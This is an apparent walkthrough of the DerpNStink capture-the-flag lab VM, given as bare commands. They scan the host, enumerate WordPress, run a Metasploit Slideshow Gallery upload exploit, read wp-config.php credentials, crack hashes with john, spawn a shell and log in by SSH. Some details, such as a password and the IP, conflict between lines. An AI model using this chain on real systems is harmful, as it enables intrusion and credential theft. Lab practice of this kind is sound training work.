<h2><b>derpnstink walk through</b></h2>

`ip a` or `ifconfig` to know the address and network
of the machine.

`netdiscover -r 192.168.0.0/24`

> 192.168.0.27

nmap -sT -AT4 192.168.0.27

searchsploit OpenSSH 6.6.1p1

ssh root@192.168.0.27

now look at http://192.168.0.27

now move to

192.168.0.27/robots.txt

gospider -s http://192.168.0.27
dirb http://192.168.0.27

echo "192.168.0.27 derpnstink.local" >> /etc/hosts


wpscan -u http://192.168.0.27/weblog -enumerate at -enumerate ap -enumerate u 


search slideshow Gallery

use exploit/unix/webapp/wp_slideshowgallery_upload

show options

set RHOST 192.168.0.27
set targeturi /weblog
set wp_user admin
set wp_password admin
exploit

sysinfo
cd /var/www/html/weblog

cat wp-config.php

// find login name and hashes and login 
// to 192.168.0.27/php/phpmyadmin


john hashs.txt --wordlist=/usr/share/wordlists/rockyou.txt


>unclestinky
>wedgie57

python -c 'import pty; pty.spawn("/bin/bash")'

su stinky
>wedigie57

ssh -i stinky.key stinky@192.168.0.26




